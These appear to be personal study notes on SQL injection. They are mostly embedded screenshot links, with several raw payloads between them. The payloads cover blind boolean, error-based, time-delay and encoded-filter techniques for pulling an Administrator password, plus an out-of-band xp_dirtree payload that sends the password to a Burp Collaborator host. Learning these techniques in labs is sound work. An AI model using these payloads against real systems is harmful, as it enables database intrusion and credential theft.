
![[Pasted image 20241202195825.png]]
![[Pasted image 20241202195857.png]]
![[Pasted image 20241202202518.png]]
![[Pasted image 20241202202534.png]]

![[Pasted image 20241202203311.png]]

![[Pasted image 20250617210641.png]] 
![[Pasted image 20250617210805.png]]
![[Pasted image 20250617212431.png]]
![[Pasted image 20250617212649.png]]![[Pasted image 20250618211742.png]]
![[Pasted image 20250618220237.png]]
![[Pasted image 20250618222034.png]]
![[Pasted image 20250625221610.png]]

![[Pasted image 20250626212922.png]]
![[Pasted image 20250626215102.png]]
![[Pasted image 20250626215111.png]]


![[Pasted image 20250627195545.png]]
![[Pasted image 20250627200051.png]]
![[Pasted image 20250627202453.png]]
![[Pasted image 20250627202641.png]]

' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's


![[Pasted image 20250627211344.png]]
![[Pasted image 20250627211444.png]]
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`



![[Pasted image 20250627220041.png]]
![[Pasted image 20250627220146.png]]


![[Pasted image 20250627221032.png]]
![[Pasted image 20250627221203.png]]

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`


![[Pasted image 20250627221933.png]]
![[Pasted image 20250627223503.png]]
![[Pasted image 20250627223810.png]]
`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`



![[Pasted image 20250627224749.png]]

<"storeId>999 &#x53;ELECT * FROM information_schema.tables<"/storeId> 


![[Pasted image 20250703231222.png]]
![[Pasted image 20250703231307.png]]